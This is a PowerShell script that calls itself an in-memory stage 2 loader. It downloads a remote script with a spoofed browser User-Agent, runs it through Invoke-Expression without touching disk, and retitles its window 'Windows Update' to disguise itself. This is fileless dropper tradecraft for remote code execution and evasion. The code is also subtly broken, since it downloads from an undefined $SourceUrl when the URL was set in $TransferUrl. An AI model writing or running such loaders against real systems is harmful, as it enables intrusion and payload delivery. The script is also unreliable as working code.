<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\loader.ps1
#>
$TransferUrl = 'https://localhost:8080/stage2.ps1'
$StageTimeout = 14
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $StageScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($StageScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $StageScript.Length)
    Invoke-Expression $StageScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Windows Update"
